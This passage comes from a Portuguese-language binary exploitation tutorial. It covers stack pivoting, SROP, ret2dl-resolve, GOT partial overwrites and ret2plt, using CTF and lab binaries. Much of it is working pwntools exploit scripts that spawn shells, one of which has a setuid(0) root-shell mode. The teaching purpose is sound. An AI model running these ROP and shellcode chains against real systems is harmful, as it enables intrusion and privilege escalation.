payload += pop_rdi
payload += p64(0x00601028)
payload += p64(io.elf.plt['print_file'])

io.sendline(payload)
io.recvuntil(&quot;!\n&quot;)
log.success(io.recv(512))
io.close()
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="pivot"><a class="header" href="#pivot">Pivot</a></h1>
<pre><code>3d3523f651e7730be0c7c2347ab109dd0842dc29cec3d5fe0c868afc6803026c  pivot
8de035bdc097b881c2118c09ce995b78f49019582cfe6e1b3a584dbebe1c3481  libpivot.so
</code></pre>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *
from time import sleep

# --------------------------------------------------  
# Inicializar
# --------------------------------------------------  
if args.LOG: context.log_level = &quot;info&quot;
else       : context.log_level = &quot;critical&quot;

binary = ELF(&quot;pivot&quot;)
libc = binary.libc

io = process(binary.path)
io.recvuntil(&quot;pivot: &quot;)
leak = int(io.recv(14)[2::],16)
log.info(&quot;Leak: &quot;+hex(leak))

io.recvuntil(&quot;&gt; &quot;)

# --------------------------------------------------  
# Gadgets
# --------------------------------------------------
# Misc
pop_rdi = p64(0x0000000000400a33) 
pop_rax = p64(0x00000000004009bb)
pop_rbp = p64(0x00000000004007c8)
add_rax_rbp = p64(0x00000000004009c4) 
pop_rsi_r15 = p64(0x0000000000400a31) 


# Pivot
xchg_rsp = p64(0x00000000004009bd) # xchg rax, rsp; ret; 

# Read
mov_eax_rax = p64(0x00000000004009c1) # mov eax, dword ptr [rax]; ret;

# Exec
call_rax = p64(0x00000000004006b0) # call rax; depois coloca um lixin p64 
pop_r12_13_14_15 = p64(0x0000000000400a2c) 
one_gadget = 0xcbd1a
# 0xcbd1a execve(&quot;/bin/sh&quot;, r12, r13)
# constraints:
 # [r12] == NULL || r12 == NULL
 # [r13] == NULL || r13 == NULL

# --------------------------------------------------  
# Primeira Fase
# --------------------------------------------------  
fase1 = b&quot;&quot;
fase1 += b&quot;B&quot;*40
fase1 += pop_rax   
fase1 += p64(leak) # leak == fase2
fase1 += xchg_rsp  # rsp == fase2

# Entao, caso coloquemos uma ROP chain no leak, ela sera executada

# --------------------------------------------------  
# Segunda Fase
# --------------------------------------------------  
def get_shell():
	fase2 = b''
	# Ler a got de puts
	fase2 += pop_rax 
	fase2 += p64(binary.got.puts)
	fase2 += mov_eax_rax # mov eax [rax]

	# agora temos o FINAL de puts em rax
	# inicio do puts == ao do leak
	# Entao podemos calcular o resto dele a partir do leak
	# leak  = 0x7fb5       27 4a 9f 10 
	# final = 0x           27 52 45 f0
	# (leak &gt;&gt; 4*8  &lt;&lt; 4*8) + final_puts == puts
	# 0x7fb500000000 + final_puts = 0x7fb5275245f0 (puts)

	# calcular o endereco do one_gadget usando puts como referencia
	fase2 += pop_rbp
	fase2 += p64( (leak &gt;&gt; 4*8 &lt;&lt; 4*8) - (libc.sym.puts - one_gadget) )
	fase2 += add_rax_rbp
	    # lembrete: libc.sym e um  offset dentro do libc (e o one_gadget tambem)

	# one gadget constraints r12 r13 == NULL
	fase2 += pop_r12_13_14_15
	fase2 += p64(0)*4 
	fase2 += call_rax

	return fase2

def privesc():
	setuid = b''
	# Ler a got de puts
	setuid += pop_rax
	setuid += p64(binary.got.puts)
	setuid += mov_eax_rax # mov eax [rax]
	
	# calcular o endereco de setuid usando puts como referencia
	setuid += pop_rbp
	setuid += p64( (leak &gt;&gt; 4*8 &lt;&lt; 4*8) - (libc.sym.puts - libc.sym.setuid) )
	setuid += add_rax_rbp

	setuid += pop_rdi
	setuid += p64(0)
	setuid += call_rax
	setuid += p64(0)

	return setuid

def foothold():
	libpivot = ELF(&quot;libpivot.so&quot;)

	# Executar foothold_function para popular o got
	challenge = b''
	challenge += pop_rax
	challenge += p64(binary.plt.foothold_function)
	challenge += call_rax
	challenge += p64(0)

	# Ler a got de foothold_function
	challenge += pop_rax
	challenge += p64(binary.got.foothold_function)
	challenge += mov_eax_rax # mov eax [rax]
	
	# calcular o endereco de ret2win usando foothold como referencia
	challenge += pop_rbp
	challenge += p64( (leak &gt;&gt; 4*8 &lt;&lt; 4*8) - (libpivot.sym.foothold_function - libpivot.sym.ret2win) )
	challenge += add_rax_rbp

	challenge += call_rax
	challenge += p64(0)

	return challenge

# --------------------------------------------------  
# :D
# --------------------------------------------------  
log.critical('''
ARGV modos:
	SHELL  - shell
	PRIV   - root shell
	CTF    - print flag 

ARGV debug: 
	SLEEP  - 5 seg
	LOG    - log verboso
''')

if args.SLEEP: sleep(5)

if args.CTF:
	fase2 = foothold()
elif args.PRIV:
	fase2 = privesc() + get_shell()
elif args.SHELL:
	fase2 = get_shell()
else:
	log.critical(&quot;Por favor, selecione um modo&quot;)
	quit()

io.sendline(fase2)
io.recvuntil(&quot;&gt; &quot;)

io.sendline(fase1)

if args.CTF:
	io.recvuntil(&quot;libpivot\n&quot;)
	log.critical(io.recv(128))
else:
	io.recvuntil(&quot;!\n&quot;)
	io.interactive()
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="srop"><a class="header" href="#srop">SROP</a></h1>
<ul>
<li><a href="stack/rop/SROP/SROP.html#srop">SROP</a></li>
<li><a href="stack/rop/SROP/SROP.html#teoria">Teoria</a>
<ul>
<li><a href="stack/rop/SROP/SROP.html#processos-e-signals">Processos e Signals</a></li>
<li><a href="stack/rop/SROP/SROP.html#sigreturn">Sigreturn</a></li>
<li><a href="stack/rop/SROP/SROP.html#fake">Fake</a></li>
</ul>
</li>
<li><a href="stack/rop/SROP/SROP.html#exemplo-sem-leaks">Exemplo Sem leaks</a>
<ul>
<li><a href="stack/rop/SROP/SROP.html#download">Download</a></li>
<li><a href="stack/rop/SROP/SROP.html#solu%C3%A7%C3%A3o">Solu√ß√£o</a></li>
</ul>
</li>
<li><a href="stack/rop/SROP/SROP.html#exemplo-com-leaks">Exemplo Com Leaks</a>
<ul>
<li><a href="stack/rop/SROP/SROP.html#sropc">srop.c</a></li>
<li><a href="stack/rop/SROP/SROP.html#exploit">Exploit</a></li>
</ul>
</li>
</ul>
<h1 id="teoria-1"><a class="header" href="#teoria-1">Teoria</a></h1>
<p>Essa t√©cnica que permite voce tornar a stack execut√°vel com somente 2 gadgets!</p>
<p>A t√©cnica depende da maneira como sistemas <code>UNIX</code> cuidam dos seus processos!</p>
<p>Caso voce precise de uma revis√£o em <a href="https://0xturazzi.github.io/book/stack/ret2libc/intro.html#mprotect--ret2shellcode">mprotect + ret2shellcode</a> :D</p>
<h2 id="processos-e-signals"><a class="header" href="#processos-e-signals">Processos e Signals</a></h2>
<h2 id="sigreturn"><a class="header" href="#sigreturn">Sigreturn</a></h2>
<ul>
<li><a href="https://www.tutorialspoint.com/unix_system_calls/sigreturn.htm">tutorialspoint</a></li>
<li><a href="https://man7.org/linux/man-pages/man2/sigreturn.2.html">man sigreturn</a></li>
</ul>
<p>Quando o processo e interrompido, o kernel cria um <code>stack frame</code> 
para o <code>signal handler</code> (independentemente de padr√£o, ou 
implementado pelo programa)... Semelhantemente a quando ocorre uma 
<code>call</code> !</p>
<p>Assim como em fun√ß√µes (aonde os registers <code>non-scratch</code> precisam 
ser salvos), para criar o <code>signal handler</code> antes precisamos salvar 
o estado atual usando um struct <code>sigreturn context</code> !</p>
<p><img src="stack/rop/SROP/./sigcontext_structure.jpg" alt="sigreturn context diagram" /></p>
<p><img src="https://amriunix.com/img/Sigreturn-oriented-programming-SROP/sigcontext_structure.jpg" alt="" /></p>
<p><a href="https://amriunix.com/img/Sigreturn-oriented-programming-SROP/sigcontext_structure.jpg">Fonte imagem: amriunix</a></p>
<p>Para retornar, o <code>signal handler</code> nao pode usar um simples <code>ret</code>, 
portanto usando a <code>syscall sigreturn</code> (<code>rax</code> = <code>0xf</code>)</p>
<p>A syscall era consumir o <code>sigreturn context</code> e continuar execu√ß√£o 
normalmente!</p>
<p>Pera ai, e se nos criarmos um <code>sigreturn context</code> falso e chamarmos
essa syscall manualmente????? Como se nos fossemos um 
<code>signal handler</code> retornando?????</p>
<h2 id="fake"><a class="header" href="#fake">Fake</a></h2>
<p>Para facilitar a cria√ß√£o desse struct, podemos usar o nosso 
amigo pwntools: <a href="https://docs.pwntools.com/en/dev/rop/srop.html">pwntools SROP</a></p>
<p>Criando um struct vazio, e preenchendo-o!</p>
<pre><code class="language-py">frame = SigreturnFrame(arch=&quot;amd64&quot;)
frame.rax = 0xa
frame.rsi = 0x10
frame.rdx = 1234
frame.rip = 123
</code></pre>
<blockquote>
<p>OBS: O struct e dependente da arquitetura, por exemplo, os 
registers presente num processador ARM sao diferentes de um amd</p>
</blockquote>
<blockquote>
<p>OBS 2: Voce nao coloca p64() nos valores, se nao buga sei la</p>
</blockquote>
<p>Agora, nos somente precisamos de uma chain que chame <code>sigreturn</code></p>
<p>Eu imagino que voce possa chamar o wrapper em libc, mas para 
chamar a syscall basta executar!</p>
<pre><code class="language-x86asm">mov rax, 0xf  ; 15
syscall       ; ou int_80 em 32 bits sei la
</code></pre>
<h1 id="exemplo-sem-leaks"><a class="header" href="#exemplo-sem-leaks">Exemplo Sem leaks</a></h1>
<p>Tabela de syscalls linux: <a href="https://filippo.io/linux-syscall-table/">filippo.io</a></p>
<h2 id="download"><a class="header" href="#download">Download</a></h2>
<p><a href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/16-srop/csaw19_smallboi/small_boi">nightmare: small_boi</a></p>
<h2 id="solu√ß√£o"><a class="header" href="#solu√ß√£o">Solu√ß√£o</a></h2>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *


elf = ELF(&quot;small_boi&quot;)
io = process(elf.path)

syscall = 0x400180 # mov eax, 0xf; syscall;
                   # +5 = so a syscall

sig = SigreturnFrame(arch='amd64')
sig.rax = 59      # execve
sig.rip = syscall+5
sig.rdi = next(elf.search(b&quot;/bin/sh\x00&quot;))

payload = b'A'*40      # cyclical_find
payload += p64(syscall)
payload += bytes(sig)

io.sendline(payload)
io.interactive()

</code></pre>
<h1 id="exemplo-com-leaks"><a class="header" href="#exemplo-com-leaks">Exemplo Com Leaks</a></h1>
<h2 id="sropc"><a class="header" href="#sropc">srop.c</a></h2>
<ul>
<li><a href="https://amriunix.com/post/sigreturn-oriented-programming-srop/">amriunix</a></li>
<li><a href="https://0x00sec.org/t/srop-signals-you-say/2890">0x00sec</a></li>
</ul>
<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
// gcc srop.c -o srop -no-pie -fno-stack-protector
void syscall_(){
       __asm__(&quot;syscall; ret;&quot;);
}

void set_rax(){
       __asm__(&quot;movl $0xf, %eax; ret;&quot;);
}

int main(){
       // ONLY SROP!
       char buff[100];
       printf(&quot;Buff @%p, can you SROP?\n&quot;, buff);
       read(0, buff, 5000);
       return 0;
}
</code></pre>
<h2 id="exploit"><a class="header" href="#exploit">Exploit</a></h2>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *


elf = context.binary = ELF(&quot;./srop&quot;)

io = process(elf.path)
io.recvuntil('@')

stack_leak = int(io.recv(14),16)
log.info(&quot;Stack Leak: &quot; + hex(stack_leak))

io.recvuntil(&quot;?\n&quot;)

# Pular Func Prologo
elf.sym.syscall_ += 4
# pwndbg&gt; disassemble syscall_ 
# Dump of assembler code for function syscall_:
#     0x0000000000401132 &lt;+0&gt;:	push   rbp
#     0x0000000000401133 &lt;+1&gt;:	mov    rbp,rsp
#     0x0000000000401136 &lt;+4&gt;:	syscall 
#     0x0000000000401138 &lt;+6&gt;:	ret    
#     0x0000000000401139 &lt;+7&gt;:	nop
#     0x000000000040113a &lt;+8&gt;:	pop    rbp
#     0x000000000040113b &lt;+9&gt;:	ret    

elf.sym.set_rax += 4 
# pwndbg&gt; disassemble set_rax 
# Dump of assembler code for function set_rax:
#      0x000000000040113c &lt;+0&gt;:	push   rbp
#      0x000000000040113d &lt;+1&gt;:	mov    rbp,rsp
#      0x0000000000401140 &lt;+4&gt;:	mov    eax,0xf
#      0x0000000000401145 &lt;+9&gt;:	ret    
#      0x0000000000401146 &lt;+10&gt;:	nop
#      0x0000000000401147 &lt;+11&gt;:	pop    rbp
#      0x0000000000401148 &lt;+12&gt;:	ret    



payload = b&quot;&quot;
payload += asm(shellcraft.execve(&quot;/bin/sh\x00&quot;))
payload += b&quot;A&quot;*(120 - len(payload))
payload += p64(elf.sym.set_rax)
payload += p64(elf.sym.syscall_)        # sigreturn syscall

frame = SigreturnFrame(arch=&quot;amd64&quot;)
frame.rax = 0xa                         # mprotect syscall
frame.rdi = (stack_leak &gt;&gt; 12) &lt;&lt; 12    # Addr
frame.rsi = 0x21000                     # Size
frame.rdx = 7                           # Perms
frame.rip = elf.sym.syscall_            # syscall (mrprotect); Ret
frame.rsp = stack_leak + len(payload) + len(frame) # ret addr
                                        #              \\  
payload += bytes(frame)                 #              \\
payload += p64(stack_leak)              #   &lt;------------
                                        #
                                        # stack_leak ---&gt; shellcode


io.sendline(payload)
io.interactive()
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ret2dl-resolve"><a class="header" href="#ret2dl-resolve">Ret2dl-resolve</a></h1>
<ul>
<li><a href="stack/rop/ret2dlresolve.html#ret2dl-resolve">Ret2dl-resolve</a></li>
<li><a href="stack/rop/ret2dlresolve.html#teoria">Teoria</a>
<ul>
<li><a href="stack/rop/ret2dlresolve.html#jmprel">JMPREL</a></li>
<li><a href="stack/rop/ret2dlresolve.html#strtab">STRTAB</a></li>
<li><a href="stack/rop/ret2dlresolve.html#symtab">SYMTAB</a></li>
<li><a href="stack/rop/ret2dlresolve.html#exemplo">Exemplo</a></li>
<li><a href="stack/rop/ret2dlresolve.html#_dl_runtime_resolve">_dl_runtime_resolve</a></li>
</ul>
</li>
<li><a href="stack/rop/ret2dlresolve.html#exploit">Exploit</a></li>
<li><a href="stack/rop/ret2dlresolve.html#manual">Manual</a></li>
<li><a href="stack/rop/ret2dlresolve.html#ctfs">CTFs</a></li>
<li><a href="stack/rop/ret2dlresolve.html#fontes-e-cr%C3%A9ditos">Fontes e cr√©ditos</a></li>
</ul>
<p>Nos ja sabemos que, quando o programa usa uma fun√ß√£o do libc, 
ela ter√° uma entrada na plt, que somente quando usada sera 
preenchida na got...</p>
<p>Mas e se o programa nao usar uma fun√ß√£o, existe algum jeito de 
resolve-la?</p>
<h1 id="teoria-2"><a class="header" href="#teoria-2">Teoria</a></h1>
<p>A section <code>.dynamic</code> contem os dados usados para que <code>ld.so</code> 
resolva os s√≠mbolos... Voce pode ve-la usando <code>readelf -d</code></p>
<pre><code class="language-py">$ readelf -d /bin/ls

Dynamic section at offset 0x21a58 contains 28 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libselinux.so.1]
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
 0x000000000000000c (INIT)               0x4000
 0x000000000000000d (FINI)               0x17574
 0x0000000000000019 (INIT_ARRAY)         0x22010
 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)
 0x000000000000001a (FINI_ARRAY)         0x22018
 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)
 0x000000006ffffef5 (GNU_HASH)           0x3a0
 0x0000000000000005 (STRTAB)             0x1190
 0x0000000000000006 (SYMTAB)             0x488
 0x000000000000000a (STRSZ)              1612 (bytes)
 0x000000000000000b (SYMENT)             24 (bytes)
 0x0000000000000015 (DEBUG)              0x0
 0x0000000000000003 (PLTGOT)             0x22c58
 0x0000000000000002 (PLTRELSZ)           2544 (bytes)
 0x0000000000000014 (PLTREL)             RELA
 0x0000000000000017 (JMPREL)             0x2cb8
 0x0000000000000007 (RELA)               0x1968
 0x0000000000000008 (RELASZ)             4944 (bytes)
 0x0000000000000009 (RELAENT)            24 (bytes)
 0x000000000000001e (FLAGS)              BIND_NOW
 0x000000006ffffffb (FLAGS_1)            Flags: NOW PIE
 0x000000006ffffffe (VERNEED)            0x18f8
 0x000000006fffffff (VERNEEDNUM)         1
 0x000000006ffffff0 (VERSYM)             0x17dc
 0x000000006ffffff9 (RELACOUNT)          193
 0x0000000000000000 (NULL)               0x0
</code></pre>
<p>Porem para essa tecnica so precisamos de 3: STRTAB, SYMTAB, JMPREL</p>
<h2 id="jmprel"><a class="header" href="#jmprel">JMPREL</a></h2>
<p>JMPREL (<code>.rel.plt</code>) contem a <code>Relocation Table</code>. A qual contem o 
endereco dos simbolos realocados. Ela pode ser lida com 
<code>readelf -r</code></p>
<p>Com <code>Sym.Name</code> sendo o nome, <code>Offset</code> o endereco na GOT, e
<code>Info e Type</code> sendo mais alguns metadados</p>
<pre><code class="language-C"># readelf -r ./babystack

Relocation section '.rel.dyn' at offset 0x2a8 contains 1 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ffc  00000306 R_386_GLOB_DAT    00000000   __gmon_start__

Relocation section '.rel.plt' at offset 0x2b0 contains 3 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
0804a010  00000207 R_386_JUMP_SLOT   00000000   alarm@GLIBC_2.0
0804a014  00000407 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
</code></pre>
<p>O tipo das entradas √© <code>ELF32_Re1</code></p>
<pre><code class="language-C">typedef uint32_t Elf32_Addr ; 
typedef uint32_t Elf32_Word ; 
typedef struct 
{
   Elf32_Addr r_offset ; /* Address */ 
   Elf32_Word r_info ; /* Relocation type and symbol index */ 
} Elf32_Rel ; 
#define ELF32_R_SYM(val) ((val) &gt;&gt; 8) 
#define ELF32_R_TYPE(val) ((val) &amp; 0xff)
</code></pre>
<p>Por exemplo para:</p>
<pre><code> Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
</code></pre>
<ul>
<li>ELF32_R_SYM(r_info) == 1 
<ul>
<li>0x0107 &gt;&gt; 8 == 1 </li>
</ul>
</li>
<li>ELF32_R_TYPE(r_info) == 7 (R_386_JUMP_SLOT)
<ul>
<li>0x0107 &amp;&amp; 0xff = 0x0007</li>
</ul>
</li>
</ul>
<h2 id="strtab"><a class="header" href="#strtab">STRTAB</a></h2>
<p>STRTAB √© uma table que armazena as strings para os nomes dos 
s√≠mbolos</p>
<pre><code class="language-C">gdb&gt; x/10s 0x804822c # Endere√ßo STRTAB
0x804822c:	&quot;&quot;
0x804822d:	&quot;libc.so.6&quot;
0x8048237:	&quot;_IO_stdin_used&quot;
0x8048246:	&quot;read&quot;
0x804824b:	&quot;alarm&quot;
0x8048251:	&quot;__libc_start_main&quot;
0x8048263:	&quot;__gmon_start__&quot;
0x8048272:	&quot;GLIBC_2.0&quot;
</code></pre>
<h2 id="symtab"><a class="header" href="#symtab">SYMTAB</a></h2>
<p>SYMTAB √© uma table que armazena <code>ELF32_Sym</code>... </p>
<p>O qual contem <code>st_name</code>: o offset do nome do simbolo dentro da 
STRTAB</p>
<pre><code class="language-C">typedef struct 
{ 
   Elf32_Word st_name ; /* Symbol name (string tbl index) */
   Elf32_Addr st_value ; /* Symbol value */ 
   Elf32_Word st_size ; /* Symbol size */ 
   unsigned char st_info ; /* Symbol type and binding */ 
   unsigned char st_other ; /* Symbol visibility under glibc&gt;=2.2 */ 
   Elf32_Section st_shndx ; /* Section index */ 
} Elf32_Sym ;
</code></pre>
<p><code>st_name</code> √© o primeiro membro do struct</p>
<p>Nos podemos saber qual o index do nosso simbolo na SYMTAB, 
usando a macro <code>ELF32_R_SYM</code></p>
<h2 id="exemplo-1"><a class="header" href="#exemplo-1">Exemplo</a></h2>
<p>Portanto:</p>
<ul>
<li>JMPREL - r_value (que vira o index na SYMTAB), endere√ßo na GOT</li>
<li>STRTAB - Armazena os nomes</li>
<li>SYMTAB - pointer para o nome na STRTAB</li>
</ul>
<p>Por exemplo para a seguinte entrada na JMPREL:</p>
<pre><code> Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
</code></pre>
<ul>
<li>ELF32_R_SYM(r_info) == 1 
<ul>
<li>0x0107 &gt;&gt; 8 == 1 </li>
</ul>
</li>
<li>ELF32_R_TYPE(r_info) == 7 (R_386_JUMP_SLOT)
<ul>
<li>0x0107 &amp;&amp; 0xff = 0x0007</li>
</ul>
</li>
</ul>
<p>O R_SYM (1) √© o offset da entrada no simbolo na 
table SYMTAB, que pode ser usado:</p>
<pre><code>0x80481cc  +   1   * 16
SYMTAB     + index * sizeof(entry)) 
</code></pre>
<p>Checando esse endere√ßo, nos temos o struct referente a 
aquele simbolo, e portanto no mesmo endere√ßo o <code>st_name</code></p>
<p>Vamos supor que nesse caso, <code>st_name = 0x1a</code></p>
<p>Agora podemos ver o nome do simbolo no STRTAB</p>
<pre><code class="language-C">x/s 0x804822c   +   0x1a
    STRTAB      +   st_name
0x8048246:	&quot;read&quot;
</code></pre>
<h2 id="_dl_runtime_resolve"><a class="header" href="#_dl_runtime_resolve">_dl_runtime_resolve</a></h2>
<p>Agora, como funciona a resolu√ß√£o de s√≠mbolos?</p>
<p>Ver qual a entrada da GOT referente ao simbolo e pular para PLT</p>
<pre><code class="language-x86asm">read@plt:
   jmp    DWORD PTR ds:0x804a00c
   push   0x0
   jmp    0x80482f0
</code></pre>
<p>Na PLT, push em <code>reloc_offset</code> e ir para o resolvedor</p>
<p>Agora o resolvedor (<code>dl-resolve()</code>) ira usar o <code>reloc_offset</code>
para preencher as os campos de reloca√ß√£o e na SYMTAB</p>
<pre><code class="language-C++">_dl_runtime_resolve ( link_map , rel_offset );
Com:
    link_map   =  lista com todas as libs carregadas
                  _dl_runtime_resolve vai usada-las 
                  para resolver os s√≠mbolos

    rel_offset =  Offset de Elf32_Rel na JMPREL

o simbolo sera relocados a fun√ß√£o original sera chamada :D

// call nao resolvida de read(0, buf, 0x100)
_dl_runtime_resolve(link_map, rel_offset) {

    // Encontrar na JMPREL usando o offset (type = Elf32_Rel) 
    rel_entry = JMPREL + rel_offset ;

    // Encontrar na SYMTAB usando r_info (type = Elf32_Sym)
    sym_entry = &amp;SYMTAB [ ELF32_R_SYM ( rel_entry -&gt; r_info )];

    // Encontrar nome na STRTAB usando st_name (type = char* / string)
    sym_name = STRTAB + sym_entry -&gt; st_name ;

    // Usar o nome para encontrar o simbolo na lista de libs
    _search_for_symbol_(link_map, sym_name);

    // call read, ja que o simbolo foi resolvido
    read(0, buf, 0x100);
}
</code></pre>
<h1 id="exploit-1"><a class="header" href="#exploit-1">Exploit</a></h1>
<p>Nos podemos usar o helper do pwntools para facilmente gerar as 
tables com offsets corretos e tudo mais. Caso vc tenha 
curiosidade, pode ler a proxima se√ß√£o ...</p>
<p>Porem, no pwntools podemos automar isso usando:</p>
<pre><code class="language-py">elf = ELF('./vuln')
io = process(elf.path)
rop = ROP(elf)

payload = Ret2dlresolvePayload(
  elf,
  symbol='system',
  args=['/bin/sh']
)

rop.raw('A' * pad)
rop.read(0, dlresolve.data_addr) # criar tables falsas
rop.ret2dlresolve(dlresolve) # chamar dl-resolve() com reloc_offset falso

io.sendline(rop.chain()) # A chain vai chamar read de novo, para enviar as tables
io.sendline(dlresolve.payload)

io.interactive()
</code></pre>
<h1 id="manual"><a class="header" href="#manual">Manual</a></h1>
<h1 id="ctfs"><a class="header" href="#ctfs">CTFs</a></h1>
<h1 id="fontes-e-cr√©ditos"><a class="header" href="#fontes-e-cr√©ditos">Fontes e cr√©ditos</a></h1>
<ul>
<li>https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62#5-_dl_runtime_resolve</li>
<li>https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve</li>
<li>https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve/exploitation</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="derrotando-aslr"><a class="header" href="#derrotando-aslr">Derrotando ASLR</a></h1>
<pre><code class="language-py">if RELRO != FULL &amp;&amp; PIE == OFF &amp;&amp; ARCH != 32bits:
    corromper_GOT()

if RELRO == FULL &amp;&amp; PIE == OFF &amp;&amp; ARCH != 32bits:
    re2plt()

if RELRO == FULL &amp;&amp; PIE == ON  &amp;&amp; ARCH == 32bits:
    bruteforce()

else:
    desistir() # =(
</code></pre>
<p>se alguem falar &quot;blablabla elif&quot; eu juro que eu vou cometer um crime &gt;:(</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="corromper-got"><a class="header" href="#corromper-got">Corromper GOT</a></h1>
<p>Voce provavelmente ja conhece essa t√©cnica, visto que eu usei ela em ROP!</p>
<p>Mas resumindo, a GOT armazena o endere√ßo das fun√ß√µes, se voce corromper um item da GOT, quando o programa-lo, vai redirecionar para a fun√ß√£o que voce escolheu.</p>
<p>Porem no contexto de ASLR, nao podemos so botar o endere√ßo de system, pq ne.... ASLR!!!</p>
<p>Ent√£o, nos podemos fazer um overwrite parcial!</p>
<p>Dependendo da arquitetura e sistema operacional isso pode variar, porem:</p>
<pre><code class="language-py">   7f ff ff    xx xx xx   12 34 
|  Prefixo  | Parte com |  Nosso |
| SEM ASLR  |    ASLR   |  ALVO  |
</code></pre>
<p>Assim, se corrompermos so os <code>LSB</code>s, podemos ignorar a parte do ASLR...</p>
<pre><code class="language-py">puts:    7f ff ff   xx xx xx   10 00 -| offset constante
system:  7f ff ff   xx xx xx   12 34 -| entre elas 0x234

puts:    7f ff ff   11 3c 4c   10 00 -| 0x234
system:  7f ff ff   11 3c 4c   12 34 -|

puts:    7f ff ff   4c 1d 42   10 00 -| 0x234
system:  7f ff ff   4c 1d 42   12 34 -|
</code></pre>
<p>Assim, se adicionarmos ao <code>puts</code> o offset entre ele e <code>system</code>... Usando por exemplo, um gadget 
<code>add [rbx] al</code></p>
<p>Isso tamb√©m pode ser usado no valor armazenado para o <code>ret</code> em BoFs tradicionais! Caso a fun√ß√£o 
tenha sido chamada pelo libc! </p>
<p><strong>Obs:</strong> Dependendo da vuln, voce usa tipos de offsets diferentes</p>
<ul>
<li>Write -&gt; offset = System - Base_Libc</li>
<li>Add   -&gt; offset = System - puts # Ou qualquer outra fun√ß√£o</li>
</ul>
<h1 id="exemplo-2"><a class="header" href="#exemplo-2">Exemplo</a></h1>
<p>Vamos supor que temos um <code>add-what-where</code> -&gt; Ex: <code>add [rbx] al;ret;</code></p>
<pre><code class="language-py">elf = ELF(&quot;vuln123&quot;)
libc = elf.libc

got = elf.got.puts # Endere√ßo de Puts na got
got += 7 # Queremos alterar somente os bytes 7 e 8
         # Lembrando que isso depende, em alguma outra
         # Pode ser 6 7 8, etc etc....

offset = libc.sym.system - libc.sym.puts

payload = vuln_add(got, offset)
payload += elf.plt.puts # Chamar Puts por meio da plt

io.interactive()
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="stack/ASLR/ret2plt.html#teoria">Teoria</a></li>
<li><a href="stack/ASLR/ret2plt.html#beatbox-puts-puts-puts-beatbox"><BeatBox> Puts Puts Puts </BeatBox></a></li>
<li><a href="stack/ASLR/ret2plt.html#exemplo">Exemplo</a>
<ul>
<li><a href="stack/ASLR/ret2plt.html#vulnc">vuln.c</a></li>
<li><a href="stack/ASLR/ret2plt.html#exploit">exploit</a></li>
</ul>
</li>
</ul>
<h1 id="teoria-3"><a class="header" href="#teoria-3">Teoria</a></h1>
<blockquote>
<p>Vale a pena revisar GOT e PLT caso precise</p>
</blockquote>
<p>Resumo: </p>
<ul>
<li>
<p>A GOT armazena o endere√ßo da funcao apos ser resolvida!</p>
</li>
<li>
<p>Quando nos chamamos uma funcao do libc, nao estamos chamando elas  diretamente, e sim a sua entrada na PLT.</p>
</li>
<li>
<p>A PLT checa a GOT, caso o endere√ßo ja tenha sido resolvido, <code>jmp</code> la... caso o endere√ßo ainda nao tenha sido, coordena com <code>ld.so</code> para resolver!</p>
</li>
</ul>
<p>A t√©cnica ret2plt pode ser considerada o ret2libc do mundo com ASLR!</p>
<p>Da mesma maneira que pod√≠amos retornar para o libc quando o NX foi ativado, 
agora podemos voltar para a PLT!</p>
<p>Podemos fazer isso pois a PLT (e GOT) nao tem seu endere√ßo alterado pelo ASLR,
somente por PIE!</p>
<p>Nos poder√≠amos usar isso para, por exemplo, chamar system() ... mas existe 
uma alternativa mais divertida!</p>
<h1 id="beatbox-puts-puts-puts-beatbox"><a class="header" href="#beatbox-puts-puts-puts-beatbox"><BeatBox> Puts Puts Puts </BeatBox></a></h1>
<p>Nos podemos ler a GOT de uma funcao <strong>JA RESOLVIDA</strong>, e calcular o 
endere√ßo da base do libc, ja que as fun√ß√µes est√£o a um offset constante!</p>
<p>Tendo o endere√ßo base do libc, podemos chamar quantas fun√ß√µes quisermos, mesmo 
que nao tenham sido usadas originalmente pelo programa!</p>
<p>Para fazer isso, vamos usar <code>puts</code>: printa uma <code>string</code> pro terminal!</p>
<p>Vamos passar entrada para <code>puts na got</code>, assim: <code>puts vai printar o endere√ßo resolvido de puts</code></p>
<p>Em seguida, nos chamamos main (ou a funcao vulner√°vel) e executamos o BoF de 
novo, so que agora que a base do libc, podemos usar todo o seu potencial</p>
<p>Em x86_64 bits nos podemos fazer:</p>
<pre><code>pop_rdi_gadget
got.puts

plt.puts    -&gt; rdi = primeiro arg, e rdi aponta para 
              a got com o endere√ßo resolvido de puts

main
</code></pre>
<p>E em x86 bits:</p>
<pre><code>plt.puts
main
got.puts
</code></pre>
<p>Para calcular a base do libc a partir desse leak, basta fazer:</p>
<pre><code class="language-py">leak = int(recv(), 16)
libc.address = leak - libc.sym.puts
</code></pre>
<p><code>libc.sym.*</code> Armazena o offset dentro daquela vers√£o do libc, isto e:
<code>puts = base + 0x1234</code>, <code>exit = base + 0x4321</code>, <code>system = base + offset</code>, etc...</p>
<p>Portanto, com <code>leak = puts</code> -&gt; <code>leak = base + 0x1234</code> 
